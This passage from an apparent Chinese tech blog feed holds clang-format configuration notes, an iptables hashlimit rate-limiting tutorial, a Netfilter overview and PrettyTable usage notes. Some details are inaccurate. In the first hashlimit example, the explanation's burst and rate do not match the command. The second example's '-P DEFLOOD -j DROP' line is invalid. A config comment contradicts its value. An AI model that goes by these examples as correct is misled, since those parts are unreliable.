MultiLine: 多行控制语句才进行换行</span><br>  <span class="hljs-comment"># - Always: 永远换行, 建议</span><br>  AfterControlStatement: Always<br>  <span class="hljs-comment"># 下面比较容易理解, 不再作无意义的解释</span><br>  AfterEnum: <span class="hljs-literal">true</span><br>  AfterFunction: <span class="hljs-literal">true</span><br>  AfterNamespace: <span class="hljs-literal">true</span><br>  AfterObjCDeclaration: <span class="hljs-literal">true</span><br>  AfterStruct: <span class="hljs-literal">true</span><br>  AfterUnion: <span class="hljs-literal">true</span><br>  AfterExternBlock: <span class="hljs-literal">true</span><br>  BeforeCatch: <span class="hljs-literal">false</span><br>  BeforeElse: <span class="hljs-literal">true</span><br>  BeforeLambdaBody: <span class="hljs-literal">false</span><br>  BeforeWhile: <span class="hljs-literal">false</span><br>  IndentBraces: <span class="hljs-literal">false</span><br>  SplitEmptyFunction: <span class="hljs-literal">true</span><br>  SplitEmptyRecord: <span class="hljs-literal">true</span><br>  SplitEmptyNamespace: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 二元操作符前是否换行, 建议为 None</span><br>BreakBeforeBinaryOperators: None<br><span class="hljs-comment"># 概念声明前是否换行, 建议 Always</span><br>BreakBeforeConceptDeclarations: Always<br><span class="hljs-comment"># 大括号换行风格,Custom即可, 具体值可参考上方文档</span><br>BreakBeforeBraces: Custom<br><span class="hljs-comment"># 继承列表括号前换行, false即可</span><br>BreakBeforeInheritanceComma: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 是否将整个继承列表换行</span><br>BreakInheritanceList: BeforeColon<br>BreakBeforeTernaryOperators: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 是否在构造函数初始化列表的,前换行</span><br>BreakConstructorInitializersBeforeComma: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 继承列表换行风格, 使用BeforeComma适合</span><br>BreakConstructorInitializers: BeforeComma<br><span class="hljs-comment"># Java注解相关, 跳过</span><br>BreakAfterJavaFieldAnnotations: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 字面字符串是否换行, true</span><br>BreakStringLiterals: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 代码列字符上限</span><br>ColumnLimit: 120<br><span class="hljs-comment"># pragma注释</span><br>CommentPragmas: <span class="hljs-string">&#x27;^ IWYU pragma:&#x27;</span><br><span class="hljs-comment"># 注释关键字对齐(const/volatile), 建议Leave</span><br><span class="hljs-comment"># - Leave: - 不改变开发者定义</span><br><span class="hljs-comment"># - Left: 位于类型前</span><br><span class="hljs-comment"># - Right: 位于类型后</span><br><span class="hljs-comment"># - Custom: 自定义</span><br>QualifierAlignment: Leave<br><span class="hljs-comment"># 未在文档中找到</span><br>CompactNamespaces: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 构造函数初始化列表缩进, 建议0</span><br>ConstructorInitializerIndentWidth: 0<br><span class="hljs-comment"># 函数调用续行对齐, 建议4</span><br>ContinuationIndentWidth: 4<br><span class="hljs-comment"># C++11的统一初始化列表大括号风格, 建议true</span><br>Cpp11BracedListStyle: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 提取行结束符并标准化, 建议false, 不要进行分析及自动运用, 而是强制使用UseCRLF设定来做</span><br>DeriveLineEnding: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 是否开启文件分析, 根据文件中的*/&amp;使用情况更新clang-format设定, 在无法决定时, 使用PointerAlignment代替, 不建议开启</span><br>DerivePointerAlignment: <span class="hljs-literal">false</span><br>DisableFormat: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 访问限定后是否添加空行, 建议Never</span><br>EmptyLineAfterAccessModifier: Never<br><span class="hljs-comment"># 访问限定前是否要求空行, 建议LogicalBlock</span><br>EmptyLineBeforeAccessModifier: LogicalBlock<br><span class="hljs-comment"># 实验性的自动检测同行并进行操作，建议 false</span><br>ExperimentalAutoDetectBinPacking: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 是否打包构造函数初始化列表, 建议Never, 可选:</span><br><span class="hljs-comment"># - Never: 永远不做操作, 即一个参数一行</span><br><span class="hljs-comment"># - BinPack: 两个参数一行</span><br><span class="hljs-comment"># - CurrentLine: 所有参数放置于一行, 如果放不下, 就一个参数一行</span><br><span class="hljs-comment"># - NextLine: 同CurrentLine有点像, 唯一不同就是如果放不行, 将剩余参数放置于下一行(即不自动一参一行)</span><br>PackConstructorInitializers: Never<br>BasedOnStyle: <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># 废弃配置</span><br>ConstructorInitializerAllOnOneLineOrOnePerLine: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 废弃配置</span><br>AllowAllConstructorInitializersOnNextLine: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 是否强制在namespace结尾增加 // namespace xxx, 建议为true</span><br>FixNamespaceComments: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 大于多少行namespace内的代码行时才在namespace结尾添加 // namespace xxx, 建议0，即无论如何都添加</span><br>ShortNamespaceLines: 0<br><span class="hljs-comment"># Macro宏</span><br>ForEachMacros:<br>  - foreach<br>  - Q_FOREACH<br>  - BOOST_FOREACH<br><span class="hljs-comment">#If宏</span><br>IfMacros:<br>  - KJ_IF_MAYBE<br><span class="hljs-comment"># include代码块操作, 前提是SortIncludes开启:</span><br><span class="hljs-comment"># - Preserve: 只对每个代码块排序</span><br><span class="hljs-comment"># - Merge: 对所有代码块合并, 并在合并后排序</span><br><span class="hljs-comment"># - Regroup: 对所有include块进行分析, 并重新分块, 不建议!</span><br>IncludeBlocks: Preserve<br><span class="hljs-comment"># Include Sort选项, 可选:</span><br><span class="hljs-comment"># - Never: 永远不, 建议</span><br><span class="hljs-comment"># - CaseSensitive: 大小写敏感排序</span><br><span class="hljs-comment"># - CaseInsensitive: 大小写不敏感排序</span><br>SortIncludes: Never<br><span class="hljs-comment"># Include种类, 默认即可</span><br>IncludeCategories:<br>  - Regex: <span class="hljs-string">&#x27;^&quot;(llvm|llvm-c|clang|clang-c)/&#x27;</span><br>    Priority: 2<br>    SortPriority: 0<br>    CaseSensitive: <span class="hljs-literal">false</span><br>  - Regex: <span class="hljs-string">&#x27;^(&lt;|&quot;(gtest|gmock|isl|json)/)&#x27;</span><br>    Priority: 3<br>    SortPriority: 0<br>    CaseSensitive: <span class="hljs-literal">false</span><br>  - Regex: <span class="hljs-string">&#x27;.*&#x27;</span><br>    Priority: 1<br>    SortPriority: 0<br>    CaseSensitive: <span class="hljs-literal">false</span><br>IncludeIsMainRegex: <span class="hljs-string">&#x27;(Test)?$&#x27;</span><br>IncludeIsMainSourceRegex: <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># 缩进访问控制</span><br>IndentAccessModifiers: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 缩进case语句, 建议 false</span><br>IndentCaseLabels: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 缩进case body, 建议true</span><br>IndentCaseBlocks: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 缩进goto标签</span><br>IndentGotoLabels: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 预处理指示(PPD-PreProcessor Directive)缩进, 建议None</span><br><span class="hljs-comment"># - None: 不缩进</span><br><span class="hljs-comment"># - AfterHash: #不缩进, #后面的指示缩进</span><br><span class="hljs-comment"># - BeforeHash: #跟前缩进</span><br>IndentPPDirectives: None<br><span class="hljs-comment"># extern &quot;C&quot;缩进, 建议AfterExternBlock</span><br>IndentExternBlock: AfterExternBlock<br><span class="hljs-comment"># 模板require是否缩进</span><br>IndentRequiresClause: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 缩进宽度</span><br>IndentWidth: 4<br><span class="hljs-comment"># 函数名换行时, 是否缩进(即返回值跟名字不同行时), 建议false</span><br>IndentWrappedFunctionNames: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 是否在代码块中(if/else/for/do/while)强制插入大括号, 建议false</span><br>InsertBraces: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 是否强制插入拖尾的&#x27;,&#x27;, 建议为None</span><br>InsertTrailingCommas: None<br><span class="hljs-comment"># Java相关, 跳过</span><br>JavaScriptQuotes: Leave<br>JavaScriptWrapImports: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 是否block开始前有一个empty line, 诡异, 直接false</span><br>KeepEmptyLinesAtTheStartOfBlocks: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 未找到定义</span><br>LambdaBodyIndentation: Signature<br><span class="hljs-comment"># 宏开始的正则, 不使用</span><br>MacroBlockBegin: <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># 宏结束的正则, 不使用</span><br>MacroBlockEnd: <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># 空行保持, 建议为1</span><br>MaxEmptyLinesToKeep: 1<br><span class="hljs-comment"># Namespace内的对齐, 直接使用None即可, 即所有namespace内(包括内嵌的)都不indent</span><br>NamespaceIndentation: None<br><span class="hljs-comment"># Obj-C语言设置, 跳过</span><br>ObjCBinPackProtocolList: Auto<br>ObjCBlockIndentWidth: 4<br>ObjCBreakBeforeNestedBlockParam: <span class="hljs-literal">true</span><br>ObjCSpaceAfterProperty: <span class="hljs-literal">false</span><br>ObjCSpaceBeforeProtocolList: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 罚分设定(根据你的&quot;违规&quot;值选择罚分少的)</span><br>PenaltyBreakAssignment: 2<br>PenaltyBreakBeforeFirstCallParameter: 19<br>PenaltyBreakComment: 300<br>PenaltyBreakFirstLessLess: 120<br>PenaltyBreakOpenParenthesis: 0<br>PenaltyBreakString: 1000<br>PenaltyBreakTemplateDeclaration: 10<br>PenaltyExcessCharacter: 1000000<br>PenaltyReturnTypeOnItsOwnLine: 60<br>PenaltyIndentedWhitespace: 0<br><span class="hljs-comment"># 指针对齐, 建议Right</span><br>PointerAlignment: Right<br><span class="hljs-comment"># 引用对齐, 可选:</span><br><span class="hljs-comment"># - Pointer: 使用&#x27;PointerAlignment&#x27;配置, 建议使用</span><br><span class="hljs-comment"># - Left: Left</span><br><span class="hljs-comment"># - Right: Right</span><br>ReferenceAlignment: Pointer<br><span class="hljs-comment"># 预处理对齐宽度</span><br>PPIndentWidth: -1<br><span class="hljs-comment"># 是否允许clang-format尝试重新粘合注释(true/false), 不建议使用</span><br>ReflowComments: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 是否移除多余的&#123;&#125;, 不建议</span><br>RemoveBracesLLVM: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 模板中的require语句位置, 建议OwnLine</span><br>RequiresClausePosition: OwnLine<br><span class="hljs-comment"># 分隔不同定义块, 建议Always, 可选:</span><br><span class="hljs-comment"># - Leave - 不处理, 建议, 即由业务决定, 也可以使用Always</span><br><span class="hljs-comment"># - Always - 永远进行分隔</span><br><span class="hljs-comment"># - Never: 永远 不进行, 不建议</span><br>SeparateDefinitionBlocks: Leave<br><span class="hljs-comment"># Java项, 跳过</span><br>SortJavaStaticImport: Before<br><span class="hljs-comment"># 排序using语句(true/false), 不建议开启</span><br>SortUsingDeclarations: <span class="hljs-literal">false</span><br><span class="hljs-comment"># C风格cast的类型括号后面是否增加space(true/false), 比较诡异, 建议false</span><br>SpaceAfterCStyleCast: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 逻辑非操作(!)后面是否加space(true/false), 比较诡异, 建议false</span><br>SpaceAfterLogicalNot: <span class="hljs-literal">false</span><br><span class="hljs-comment"># template关键字后面是否加space(true/false), 建议true, 即template &lt;xxx&gt;, 而不是template&lt;xxx&gt;</span><br>SpaceAfterTemplateKeyword: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 赋值语句操作符前是否添加space(true/false), 建议true</span><br>SpaceBeforeAssignmentOperators: <span class="hljs-literal">true</span><br><span class="hljs-comment"># case语句:前是否增加space(true/false), 建议false</span><br>SpaceBeforeCaseColon: <span class="hljs-literal">false</span><br><span class="hljs-comment"># c++11的统一初始化列表的大括号中是否添加space(true/false), 建议false</span><br>SpaceBeforeCpp11BracedList: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 构造函数初始化列表:前是否加space(true/false), 建议false</span><br>SpaceBeforeCtorInitializerColon: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 继承列表的:前是否加space(true/false), 建议true</span><br>SpaceBeforeInheritanceColon: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 圆括号前是否增加空格: 建议只在控制语句的贺括号前增加, 即配置为ControlStatements即可</span><br>SpaceBeforeParens: ControlStatements<br><span class="hljs-comment"># SpaceBeforeParens为Custom时使用</span><br>SpaceBeforeParensOptions:<br>  AfterControlStatements: <span class="hljs-literal">true</span><br>  AfterForeachMacros: <span class="hljs-literal">true</span><br>  AfterFunctionDefinitionName: <span class="hljs-literal">false</span><br>  AfterFunctionDeclarationName: <span class="hljs-literal">false</span><br>  AfterIfMacros: <span class="hljs-literal">true</span><br>  AfterOverloadedOperator: <span class="hljs-literal">false</span><br>  AfterRequiresInClause: <span class="hljs-literal">false</span><br>  AfterRequiresInExpression: <span class="hljs-literal">false</span><br>  BeforeNonEmptyParentheses: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 指针修饰的space添加, 建议Default, 即使用PointerAlignment代替</span><br>SpaceAroundPointerQualifiers: Default<br><span class="hljs-comment"># Loop关键字前前是否增加space, 建议true</span><br>SpaceBeforeRangeBasedForLoopColon: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 空body是否添加space, 建议true</span><br>SpaceInEmptyBlock: <span class="hljs-literal">true</span><br><span class="hljs-comment"># 圆括号前是否增加space, 建议false, true太多影响代码紧凑</span><br>SpaceInEmptyParentheses: <span class="hljs-literal">false</span><br><span class="hljs-comment"># Trailing注释前的空格数, 建议1</span><br>SpacesBeforeTrailingComments: 1<br><span class="hljs-comment"># &lt;&gt;里面是否增加space, 不建议, 配置成Never即可</span><br>SpacesInAngles: Never<br><span class="hljs-comment"># 条件语句()里面是否增加space, 不建议, 配置成Never即可</span><br>SpacesInConditionalStatement: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 容器初始化列表[]/&#123;&#125;里面是否增加space, 不建议(跟C++11风格保持一致)</span><br>SpacesInContainerLiterals: <span class="hljs-literal">false</span><br><span class="hljs-comment"># C风格的转换()里面是否增加space, 不建议</span><br>SpacesInCStyleCastParentheses: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 行注释前的空格范围数量, 建议Maximum关闭, 设置成-1, 即//到你的注释内容前的空格数量至少是1, 至多是无穷</span><br>SpacesInLineCommentPrefix:<br>  Minimum: 1<br>  Maximum: -1<br><span class="hljs-comment"># 贺括号内是否加space, false</span><br>SpacesInParentheses: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 中括号内是否加space, false</span><br>SpacesInSquareBrackets: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 大括号内是否加space, false</span><br>SpaceBeforeSquareBrackets: <span class="hljs-literal">false</span><br><span class="hljs-comment"># 位定义:前后是否增加空格, 可选:</span><br><span class="hljs-comment"># - Both: 前后都添加</span><br><span class="hljs-comment"># - Before: 只在前增加</span><br><span class="hljs-comment"># - After: 只在后增加</span><br><span class="hljs-comment"># - None: 不增加, 建议, 没有必要因为过多的space(s)影响代码紧凑</span><br>BitFieldColonSpacing: None<br><span class="hljs-comment"># C++标准, Latest即可</span><br>Standard: Latest<br>StatementAttributeLikeMacros:<br>  - Q_EMIT<br>StatementMacros:<br>  - Q_UNUSED<br>  - QT_REQUIRE_VERSION<br><span class="hljs-comment"># Tab宽度, 建议4</span><br>TabWidth: 4<br><span class="hljs-comment"># 不使用CRLF, 强制关闭, 如果DeriveLineEnding为true却未自动决策出来, 此项用于fallback策略</span><br>UseCRLF: <span class="hljs-literal">false</span><br><span class="hljs-comment"># Tab使用, 没有必要使用, 直接Never</span><br>UseTab: Never<br><span class="hljs-comment"># 空格敏感宏列表</span><br>WhitespaceSensitiveMacros:<br>  - STRINGIZE<br>  - PP_STRINGIZE<br>  - BOOST_PP_STRINGIZE<br>  - NS_SWIFT_NAME<br>  - CF_SWIFT_NAME<br></code></pre></td></tr></table></figure><h1 id="三、编辑器集成"><a href="#三、编辑器集成" class="headerlink" title="三、编辑器集成"></a>三、编辑器集成</h1><p>编辑器在vscode上面的集成信息</p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> 编程语言 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hashlimit-Iptables笔记</title>
      <link href="/2019/01/04/iptables-hashlimit/"/>
      <url>/2019/01/04/iptables-hashlimit/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>hashlimit是iptables的一个匹配模块，用它结合iptables的其它命令可以实现限速的功能。<strong>注意：单独hashlimit模块是无法进行限速的</strong>；</p><h1 id="二、原理介绍"><a href="#二、原理介绍" class="headerlink" title="二、原理介绍"></a>二、原理介绍</h1><p>实际上，使用 hashlimit 进行限速主要包括两个步骤：</p><ul><li>对符合 hashlimit 匹配规则包放行</li><li>丢弃&#x2F;拒绝未放行的包</li></ul><h2 id="2-1-令牌桶模型"><a href="#2-1-令牌桶模型" class="headerlink" title="2.1 令牌桶模型"></a>2.1 令牌桶模型</h2><p>hashlimit 的匹配方式是基于令牌桶（Token bucket）的模型，令牌桶是一种网络通讯中常见的缓冲区工作原理，它有两个重要的参数，<code>令牌桶容量n</code>和<code>令牌产生速率s</code>；</p><ul><li><code>令牌桶容量n</code>：可以把令牌当成是门票，而令牌桶则是负责制作和发放门票的管理员，它手里最多有n张令牌。初始时，管理员开始手里有n张令牌，每当一个数据包到达后，管理员就看看手里是否还有可用的令牌。如果有，就把令牌发给这个数据包，hashlimit 就告诉iptables，这个数据包被匹配了，而当管理员把手上所有的令牌都发完了，再来的数据包就拿不到令牌了；这时，hashlimit 模块就告诉 iptables ，这个数据包不能被匹配，对应参数<code>--hashlimit-burst</code>；</li><li><code>令牌产生速率s</code>：当令牌桶中的令牌数量少于n，它就会以速率s来产生新的令牌，直到令牌数量到达n为止；</li></ul><p>通过令牌桶机制，可以有效的控制单位时间内通过（匹配）的数据包数量，又可以容许短时间内突发的大量数据包的通过（只要数据包数量不超过令牌桶n），对应参数<code>--hashlimit</code>；</p><h2 id="2-2-匹配项"><a href="#2-2-匹配项" class="headerlink" title="2.2 匹配项"></a>2.2 匹配项</h2><p>除了令牌桶模型外，hashlimit 匹配的另外一个重要概念是匹配项。在hashlimit中，每个匹配项拥有一个单独的令牌桶，执行独立的匹配计算，对应参数<code>--hashlimit-mode</code>，匹配项的可选参数为以下几种：</p><ul><li><code>srcip</code>：每个源地址IP为一个匹配项；</li><li><code>dstip</code>：每个目的地址IP为一个匹配项；</li><li><code>srcport</code>：每个源端口为一个匹配项；</li><li><code>dstport</code>：每个目的端口为一个匹配项；</li></ul><h2 id="2-3-相关配置参数"><a href="#2-3-相关配置参数" class="headerlink" title="2.3 相关配置参数"></a>2.3 相关配置参数</h2><p>hashlimit 的相关匹配项参数介绍如下：</p><ul><li><p><code>--hashlimit-name</code>：该参数指定了每个调用了 hashlimit 模块的 iptables 命令而建立的文件名，该文件存放在 &#x2F;proc&#x2F;net&#x2F;ipt_hashlimit 目录中，其中保存着各匹配项的信息；</p></li><li><p><code>--hashlimit</code>：令牌产生速率，示例：5&#x2F;sec 代表每秒产生5个；</p></li><li><p><code>--hashlimit-burst</code>：令牌桶容量，默认是5；</p></li><li><p><code>--hashlimit-mode</code>：匹配项，每个匹配项拥有一个单独的令牌桶，执行独立的匹配计算，可选参数如下所示：</p><ul><li><code>srcip</code>：每个源地址IP为一个匹配项；</li><li><code>dstip</code>：每个目的地址IP为一个匹配项；</li><li><code>srcport</code>：每个源端口为一个匹配项；</li><li><code>dstport</code>：每个目的端口为一个匹配项；</li></ul></li><li><p><code>--hashlimit-htable-size</code>：设置哈希表的元值；</p></li><li><p><code>--hashlimit-htable-max</code>：设定哈希表入口最大数量；</p></li></ul><h1 id="三、示例介绍"><a href="#三、示例介绍" class="headerlink" title="三、示例介绍"></a>三、示例介绍</h1><h2 id="3-1-实例一"><a href="#3-1-实例一" class="headerlink" title="3.1 实例一"></a>3.1 实例一</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">iptables -A INPUT -p tcp --dport 1234 -m hashlimit --hashlimit-name HashLimitName --hashlimit 1/sec --hashlimit-burst 1 --hashlimit-mode srcip -j ACCEPT<br>iptables -A INPUT -p tcp --dport 1234 -j DROP<br></code></pre></td></tr></table></figure><p>上述实例解释信息为：</p><ul><li>为所有访问本机 1234 端口的不同IP建立一个匹配项；</li><li>匹配项对应的令牌桶容量为10；</li><li>令牌产生速率为5个每秒；</li><li>放行通过匹配的数据包；</li><li>丢弃所有其它访问本机 1234 端口的数据包；</li></ul><h2 id="3-2-实例二"><a href="#3-2-实例二" class="headerlink" title="3.2 实例二"></a>3.2 实例二</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">iptables -N DEFLOOD <br>iptables -A FORWARD -s 192.168.1.2/24 -m state --state NEW -j DEFLOOD <br>iptables -A DEFLOOD -m hashlimit --hashlimit-name deflood --hashlimit 10/sec <br>--hashlimit-burst 10 --hashlimit-mode srcip -j ACCEPT <br>iptables -P DEFLOOD -j DROP <br></code></pre></td></tr></table></figure><ul><li>建立了一个自定义的处理链；</li><li>所有来自于 192.168.1.2&#x2F;24 网段的并且打算新建网络连接的数据包，都进入 DEFLOOD 链处理 ；</li><li>在 DEFLOOD 链中，为每个IP建立一个匹配项，对应令牌桶容量为10，产生速率为10个每秒；</li><li>放行通过匹配的数据包；</li><li>在 DEFLOOD 链中丢弃所有其它的数据包 ；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> hashlimit </tag>
            
            <tag> iptables </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核软件框架-Netfilter概述</title>
      <link href="/2019/01/03/netfilter/"/>
      <url>/2019/01/03/netfilter/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h1><p><a href="https://www.netfilter.org/">Netfilter</a>是Linux内核中的一个软件框架，用于管理网络数据包。不仅具有网络地址转换（NAT）的功能，也具备数据包内容修改、以及数据包过滤等防火墙功能。利用运作于用户空间的应用软件，如<a href="https://www.netfilter.org/projects/iptables/index.html">iptables</a>等，来控制Netfilter，系统管理者可以管理通过Linux操作系统的各种网络数据包。1990年代，Netfilter在Linux 2.3.15版时进入Linux内核，正式应用于Linux 2.4版。</p><p>现今许多市面上许多的IP分享器或无线网络路由器（Wireless router），多是嵌入式Linux平台，并利用Netfilter的数据包处理能力，提供NAT以及防火墙的功能。此外，Netfilter平台的模块化设计使得功能具可扩展性，以及Linux核心本身属于开放的源代码，能够免费获取源代码进行修改与扩展。Netfilter平台中制定了五个数据包的挂载点（Hook），分别是PRE_ROUTING、INPUT、OUTPUT、FORWARD与POST_ROUTING。</p><h1 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h1><p>Linux网络内核中存在5条内置chain，针对于每条chain，Netfilter都有与之对应的hook，他们的对应关系如下所示（左为chain，右为hook）：</p><ul><li><code>PREROUTING</code>：由<code>NF_IP_PRE_ROUTING</code>触发；</li><li><code>INPUT</code>：由<code>NF_IP_LOCAL_IN</code>触发；</li><li><code>FORWARD</code>：由<code>NF_IP_FORWARD</code>触发；</li><li><code>OUTPUT</code>：由<code>NF_IP_LOCAL_OUT</code>触发；</li><li><code>POSTROUTING</code>：由<code>NF_IP_POST_ROUTING</code>触发；</li></ul><p>Netfilter通过在内核中嵌入的这五个NF_HOOK函数的位置上注册相关函数，截断数据包的流动，从而完成对数据包的过滤和转换。</p><p><img src="/assets/images/netfilter-1.png" alt="Packet flow in Netfilter and General Networking" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Netfilter </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PrettyTable-Python使用笔记</title>
      <link href="/2019/01/02/python-prettytable/"/>
      <url>/2019/01/02/python-prettytable/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>PrettyTable是一个简单的Python库，旨在快速，轻松地在视觉上吸引人的ASCII表中表示表格数据。 它的灵感来自PostgreSQL shell psql中使用的ASCII表。 PrettyTable允许选择要打印的列，列的独立对齐（左对齐或右对齐或居中）以及通过指定行范围打印“子表”。<a href="https://github.com/dprince/python-prettytable">GitHub</a></p><h2 id="二、安装与使用"><a href="#二、安装与使用" class="headerlink" title="二、安装与使用"></a>二、安装与使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装：使用pip可以方便的安装PrettyTable</span><br>pip install PrettyTable<br><br><span class="hljs-comment"># 使用：python代码中引入该库</span><br>import prettytable as pt<br></code></pre></td></tr></table></figure><h2 id="三、相关API介绍"><a href="#三、相关API介绍" class="headerlink" title="三、相关API介绍"></a>三、相关API介绍</h2><h3 id="3-1、创建表"><a href="#3-1、创建表" class="headerlink" title="3.1、创建表"></a>3.1、创建表</h3><h4 id="3-1-1、普通创建表："><a href="#3-1-1、普通创建表：" class="headerlink" title="3.1.1、普通创建表："></a>3.1.1、普通创建表：</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> prettytable <span class="hljs-keyword">as</span> pt<br>tb = pt.PrettyTable()<br></code></pre></td></tr></table></figure><h4 id="3-1-2、从已有的文件中创建"><a href="#3-1-2、从已有的文件中创建" class="headerlink" title="3.1.2、从已有的文件中创建"></a>3.1.2、从已有的文件中创建</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 【利用CSV文件创建】</span><br><span class="hljs-comment"># + 变量pt将是一个完全填充的PrettyTable对象；</span><br><span class="hljs-comment"># + CSV文件的第一行将被解释为字段名称并用于表头；</span><br><span class="hljs-comment"># + 可以通过传递“field_names”关键字参数来指定自己的字段名称；</span><br><span class="hljs-keyword">from</span> prettytable <span class="hljs-keyword">import</span> from_csv<br>fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;mytable.csv&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>pt = from_csv(fp)<br>fp.close()<br><br><span class="hljs-comment"># 【利用HTMl文件创建】</span><br><span class="hljs-comment"># + 变量pts将是PrettyTable对象的列表；</span><br><span class="hljs-comment">#+ HTML代码中每个&lt;table&gt;都有一个PrettyTable；</span><br><span class="hljs-keyword">from</span> prettytable <span class="hljs-keyword">import</span> from_html <br>pts = from_html(html_string)<br><br><span class="hljs-comment"># 【利用SQL获取信息创建】</span><br><span class="hljs-comment">#+ db_cur是数据库的Cursor对象</span><br><span class="hljs-comment"># + 数据库中的数据具有与DB-API2规范兼容的Python API（例如，标准库中的sqlite3 API）；</span><br><span class="hljs-comment"># + 可以使用SELECT语句的结果生成一个PrettyTable</span><br><span class="hljs-keyword">from</span> prettytable <span class="hljs-keyword">import</span> from_db_cursor <br>db_cur.execute(<span class="hljs-string">&quot;SELECT * FROM mytable&quot;</span>)<br>pt = from_db_cursor(db_cur)<br></code></pre></td></tr></table></figure><h3 id="3-2、添加元素"><a href="#3-2、添加元素" class="headerlink" title="3.2、添加元素"></a>3.2、添加元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 按行添加</span><br>pt.add_row()<br><br><span class="hljs-comment"># 按列添加</span><br>pt.add_column()<br></code></pre></td></tr></table></figure><h3 id="3-3、输出格式"><a href="#3-3、输出格式" class="headerlink" title="3.3、输出格式"></a>3.3、输出格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ASCII码表 - 直接输出</span><br><span class="hljs-built_in">print</span>(pt)<br><br><span class="hljs-comment"># ASCII码表 - 无表格框输出</span><br><span class="hljs-comment"># + get_string（）方法返回一个unicode对象，而不是ASCII编码的字节字符串；</span><br><span class="hljs-built_in">print</span>(pt.get_string())<br><br><span class="hljs-comment"># HTML表</span><br><span class="hljs-comment">#+ 可以使用“attribute”关键字参数来传递应该出现在开始&lt;table&gt;标记中的HTML属性的字典；</span><br><span class="hljs-comment">#+ 可以使用CSS来设置表格的样式而不是依赖于PrettyTable的格式；</span><br><span class="hljs-built_in">print</span>(pt.get_html_string())<br><span class="hljs-built_in">print</span>(pt.get_html_string(attributes = &#123;<span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;foo&quot;</span>&#125;))<br><br><span class="hljs-comment"># 选择子表输出</span><br><span class="hljs-built_in">print</span>(pt.get_string(fields = [<span class="hljs-string">&quot;City name&quot;</span>, <span class="hljs-string">&quot;Population&quot;</span>]))<br><br><span class="hljs-comment"># 仅输出前三列</span><br><span class="hljs-built_in">print</span>(pt.get_string(start = <span class="hljs-number">0</span>, end = <span class="hljs-number">3</span>))<br><span class="hljs-comment"># 删除除前3行以外的所有行，可通过将表切片为Python列表来创建一个只包含这些规则的新PrettyTable对象：</span><br>new_table = old_table[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br><span class="hljs-built_in">print</span>(new_table)<br><br><span class="hljs-comment"># 表排序</span><br><span class="hljs-comment">#+ 以相反的顺序对表进行排序（从大到小）</span><br><span class="hljs-built_in">print</span>(x.get_string(sortby=<span class="hljs-string">&quot;Annual Rainfall&quot;</span>, reversesort=<span class="hljs-literal">True</span>))<br></code></pre></td></tr></table></figure><h3 id="3-4、控制表样式"><a href="#3-4、控制表样式" 